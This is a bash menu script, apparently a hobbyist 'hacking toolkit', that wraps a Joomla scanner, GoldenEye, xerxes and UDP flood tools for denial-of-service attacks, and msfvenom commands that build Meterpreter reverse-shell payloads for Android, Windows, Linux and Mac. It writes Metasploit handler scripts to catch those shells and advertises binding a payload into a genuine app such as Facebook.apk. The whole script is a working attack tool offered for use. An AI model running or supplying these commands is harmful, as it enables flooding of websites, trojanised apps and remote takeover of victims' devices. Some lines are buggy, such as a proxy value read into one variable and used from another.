#!/bin/bash

mkdir rc
mkdir Payloads
clear

GREEN='\033[1;32m'
COLOR='\e[0m'

echo -e "$GREEN"
echo  "  _____     _             _   _ "
echo  " | ____|___| |_ __ _  ___| |_(_) ___ ___  "
echo  " |  _| |_  / __/ _  |/ __| __| |/ __/ __| "
echo  " | |___ / /| || (_| | (__| |_| | (__\__ \ "
echo  " |_____/___|\__\__ _|\___|\__|_|\___|___/ "
echo  "                                          "
echo " "

echo " "
echo "---------------------------------------------------------------------"
echo "                     Created By: TheTechHacker                       "
echo " SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ "
echo "---------------------------------------------------------------------"
echo -e "$COLOR"


echo -e "$GREEN"
echo "1)Install"
echo "2)site scanner"
echo "3)Exploit"
echo "4)ping site"
echo "5)DDOS/DoS"
echo "6)IP-Locator "
echo "99)exit"
echo -e "$COLOR"

echo -e "$GREEN"
read -p "ENTER> " LINUX
echo -e "$COLOR"

if [ "$LINUX" == "1" ];
then
 sudo apt-get install joomscan
 sudo apt-get install gcc
 sudo apt-get install perl
 sudo apt-get install figlet
 rm tools/xerxes/xerxes
 gcc tools/xerxes/xerxes.c -o tools/xerxes/xerxes
 ./joomscan.sh

fi

if [ "$LINUX" == "6" ]; then
 clear
 perl tools/IP-locator/ip-locator.pl
 echo "1)IP"
 echo "2)Domain"
 echo "3)host "
 echo " "
 read -p "ENTER> " PERL

fi

if [ "$PERL" == "1" ]; then
 perl tools/IP-locator/ip-locator.pl
 echo " "
 read -p "IP> " PL
 perl tools/IP-locator/ip-locator.pl $PL

fi

if [ "$PERL" == "2" ]; then
 perl tools/IP-locator/ip-locator.pl
 echo " "
 read -p "DOMAIN> " WEBSITE
 perl tools/IP-locator/ip-locator.pl $WEBSITE

fi

if [ "$PERL" == "3" ]; then
 perl tools/IP-locator/ip-locator.pl
 echo " "
 read -p "Host> " HOST
 perl tools/IP-locator/ip-locator.pl $HOST

fi

if [ "$LINUX" == "2" ];
then
 clear
 echo "=========================="
 echo "      JOOMSCAN TOOL       "
 echo "=========================="
 echo " "
 read -p " Do you want to use proxy Y for Yes and N for No: " PROXY

fi

if [ "$PROXY" == "Y" ];
then
 perl tools/joomscan/joomscan.pl
 read -p "URL> " URL
 read -p "Proxy: " PXY
 perl tools/joomscan/joomscan.pl -url $URL --proxy $IP


elif [ "$PROXY" == "y" ];
then
 perl tools/joomscan/joomscan.pl
 read -p "URL> " URL
 read -p "Proxy> " IP
 perl tools/joomscan/joomscan.pl -url $URL --proxy $IP

elif [ "$PROXY" == "N" ];
then
 clear
 perl tools/joomscan/joomscan.pl
 read -p "URL> " scan
 perl tools/joomscan/joomscan.pl -url $scan

elif [ "$PROXY" == "n" ];
then
 clear
 perl tools/joomscan/joomscan.pl
 read -p "URL> " UL
 perl tools/joomscan/joomscan.pl -url $UL

fi

if [ "$LINUX" == "3" ];
then
 echo " "
 echo -e "$GREEN 1)Android $COLOR"
 echo -e "$GREEN 2)Windows $COLOR"
 echo -e "$GREEN 3)Linux $COLOR"
 echo -e "$GREEN 4)Mac $COLOR"
 echo -e "$GREEN 5)Listen $COLOR"
 echo -e "$GREEN 6)exit $COLOR"
 echo -e "$GREEN "
 read -p "ENTER> " EXPLOIT

fi


if [ "$LINUX" == "4" ]; then
 clear
 figlet EH
 read -p "site: " PING
 ping $PING

fi

if [ "$LINUX" == "5" ];
then
clear
 echo -e "$GREEN"
 echo "  ____  ____   ___  ____    ____ ___ _____ _____"
 echo "|  _ \|  _ \ / _ \/ ___|  / ___|_ _|_   _| ____|"
 echo "| | | | | | | | | \___ \  \___ \| |  | | |  _|"
 echo "| |_| | |_| | |_| |___) |  ___) | |  | | | |___"
 echo "|____/|____/ \___/|____/  |____/___| |_| |_____|"
 echo " "
 echo "1)IP-DOS"
 echo "2)HTTP"
 echo " "
 read -p "ENTER> " DOS
 echo -e "$COLOR "

fi

if [ "$DOS" == "2" ];
then
 clear
 echo -e "$GREEN"
 read -p "url> " DDOS; read -p "workers> " TH; read -p "sockets> " SOCKS; read -p "method HTTP Method to use 'default get' or 'post'  or 'random'> " MH
 python tools/GoldenEye/goldeneye.py
 python tools/GoldenEye/goldeneye.py $DDOS -w $TH -s $SOCKS -m $MH
 echo -e "$COLOR"

fi

if [ "$DOS" == "1" ];
then
 clear
 echo -e "$GREEN"
 echo "1)TCP"
 echo "2)UDP"
 echo -e "$COLOR"
 read -p "ENTER> " SOD

fi

if [ "$SOD" == "1" ];
then
  clear
  echo -e "$GREEN"
  figlet EH
  read -p "IP> " SHELL ; read -p "PORT> " CMD
  ./tools/xerxes/xerxes $SHELL $CMD
  echo -e "$COLOR"

fi

if [ "$SOD" == "2" ];
then
 clear
 echo -e "$GREEN"
 read -p "IP> " UD; read -p "PORT> " POR; read -p "SIZE> " SIZE; read -p "Time> " TIME
 perl tools/UDP/udp.pl $UD $POR $SIZE $TIME
 echo -e "$COLOR"

fi

if [ "$LINUX" == "99" ];
then
 clear
 exit

fi


android(){
 echo -e "$GREEN"
 read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > Payloads/droid.apk
 echo " "
 echo "droid.apk saved to /batsploit/Payloads"
 echo -e "$COLOR"


 return
}

windows(){
 echo -e "$GREEN"
 read -p "LHOST=" LHOST; read -p "LPORT= " LPORT
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > Payloads/win.exe
 echo " "
 echo "win.exe saved to /batsploit/Payloads"
 echo -e "$COLOR"

 return
}

linux(){
 echo -e "$GREEN"
 read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > Payloads/linux.elf
 echo " "
 echo "linux.elf saved to /batsploit/Payloads"
 echo -e "$COLOR"

 return
}

mac(){
 echo -e "$GREEN"
 read -p "LHOST= " LHOST; read -p "LPORT= " LPORT
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho > Payloads/mac.macho
 echo " "
 echo "mac.macho saved to /batsploit/Payloads"
 echo -e "$COLOR"

 return
}


if [ "$EXPLOIT" == "5" ];
then
 clear
 echo -e "$GREEN "
 echo "1)Android"
 echo "2)Windows"
 echo "3)Linux"
 echo "4)Mac"
 echo " "
 read -p "ENTER> " KALI
 echo -e "$COLOR"

fi




case $KALI in
 1)echo -e "$GREEN"
   rm rc/android.rc
   clear
   echo "========================"
   echo "        ANDROID         "
   echo "    LHOST= YOUR IP      "
   echo "    LPORT= YOUR PORT    "
   echo "========================"
   touch rc/android.rc
   read -p "LHOST= " LHOST
   read -p "LPORT= " LPORT
   echo use exploit/multi/handler >> rc/android.rc
   echo set payload android/meterpreter/reverse_tcp >> rc/android.rc
   echo set LHOST $LHOST >> rc/android.rc
   echo set LPORT $LPORT >> rc/android.rc
   echo exploit >> rc/android.rc
   msfconsole -r rc/android.rc
   echo -e "$COLOR"
;;
 
 2)echo -e "$GREEN"
   rm rc/windows.rc
   clear
   echo "========================"
   echo "        WINDOWS         "
   echo "    LHOST= YOUR IP      "
   echo "    LPORT= YOUR PORT    "
   echo "========================"
   read -p "LHOST= " LHOST
   read -p "LPORT= " LPORT
   touch windows.rc >> rc/windows.rc
   echo use exploit/multi/handler >> rc/windows.rc
   echo set payload windows/meterpreter/reverse_tcp >> rc/windows.rc
   echo set LHOST $LHOST >> rc/windows.rc
   echo set LPORT $LPORT >> rc/windows.rc
   echo exploit >> rc/windows.rc
   msfconsole -r rc/windows.rc
   echo "$COLOR"
 ;;

 3)echo -e "$GREEN"
   rm rc/linux.rc
   clear
   echo "========================"
   echo "        LINUX           "
   echo "    LHOST= YOUR IP      "
   echo "    LPORT= YOUR PORT    "
   echo "========================"
   touch rc/linux.rc
   read -p "LHOST= " LHOST
   read -p "LPORT= " LPORT
   echo use exploit/multi/handler >> rc/linux.rc
   echo set payload linux/x86/meterpreter/reverse_tcp >> rc/linux.rc
   echo set LHOST $LHOST >> rc/linux.rc
   echo set LPORT $LPORT >> rc/linux.rc
   echo exploit >> rc/linux.rc
   msfconsole -r rc/linux.rc
   echo -e "$COLOR"
 ;;

 4)echo -e "$GREEN"
   rm rc/mac.rc
   clear
   echo "========================"
   echo "          MAC           "
   echo "    LHOST= YOUR IP      "
   echo "    LPORT= YOUR PORT    "
   echo "========================"
   touch rc/mac.rc
   read -p "LHOST= " LHOST
   read -p "LPORT= " LPORT
   echo use exploit/multi/handler >> rc/mac.rc
   echo set payload osx/x86/shell_reverse_tcp >> rc/mac.rc
   echo set LHOST $LHOST >> rc/mac.rc
   echo set LPORT $LPORT >> rc/mac.rc
   echo exploit
   msfconsole -r rc/mac.rc
   echo -e "$COLOR"
 ;;

esac


if [ "$EXPLOIT" == "1" ];
then
 clear
 echo -e "$GREEN===============================$COLOR"
 echo -e "$GREEN            Android            $COLOR"
 echo -e "$GREEN 1)Bind payload to original apk$COLOR"
 echo -e "$GREEN 2)Generate Payload            $COLOR"
 echo -e "$GREEN===============================$COLOR"
 echo -e " "
 echo -e "$GREEN 1)bind payload to apk$COLOR"
 echo -e "$GREEN 2)Generate payload$COLOR"
 echo -e "$GREEN 3)Back$COLOR"
 echo -e "$GREEN "
 read -p "Enter> " MSF
 echo -e "$COLOR"

fi

if [ "$MSF" == "1" ];
then
 clear
 echo -e "$GREEN=============================================================$COLOR"
 echo -e "$GREEN              Created By: TheTechHacker                      $COLOR"
 echo -e "$GREEN Example Original apk path:/root/Desktop/Facebook.apk        $COLOR"
 echo -e "$GREEN         LHOST= YOUR IP                                      $COLOR"
 echo -e "$GREEN         LPORT=YOUR PORT                                     $COLOR"
 echo -e "$GREEN Example New apk:/root/Desktop/Example.apk                   $COLOR"
 echo -e "$GREEN=============================================================$COLOR"
 echo "  "
 apk

fi

if [ "$MSF" == "2" ];
then
 clear
 echo -e "$GREEN==================================$COLOR"
 echo -e "$GREEN       Created By: TheTechHacker  $COLOR"
 echo -e "$GREEN         LHOST=YOUR IP            $COLOR"
 echo -e "$GREEN         LPORT=YOUR PORT          $COLOR"
 echo -e "$GREEN==================================$COLOR"
 android

fi

if [ "$MSF" == "3" ];
then
 clear
 ./joomscan.sh

fi

if [ "$EXPLOIT" == "2" ];
then
 clear
 echo -e "$GREEN========================$COLOR"
 echo -e "$GREEN          Windows       $COLOR"
 echo -e "$GREEN       LHOST=YOUR IP    $COLOR"
 echo -e "$GREEN       LPORT=YOUR PORT  $COLOR"
 echo -e "$GREEN========================$COLOR"
 echo " "
 windows

fi

if [ "$EXPLOIT" == "3" ];
then
 clear
 echo -e "$GREEN========================$COLOR"
 echo -e "$GREEN         Linux          $COLOR"
 echo -e "$GREEN      LHOST=YOUR IP     $COLOR"
 echo -e "$GREEN      LPORT=YOUR PORT   $COLOR"
 echo -e "$GREEN========================$COLOR"
 echo " "
 linux

fi

if [ "$EXPLOIT" == "4" ]; then
 clear
 echo -e "$GREEN===============================$COLOR"
 echo -e "$GREEN              Mac              $COLOR"
 echo -e "$GREEN         LHOST=YOUR IP         $COLOR"
 echo -e "$GREEN         LPORT=YOUR PORT       $COLOR"
 echo -e "$GREEN===============================$COLOR"
 echo " "
 mac
fi
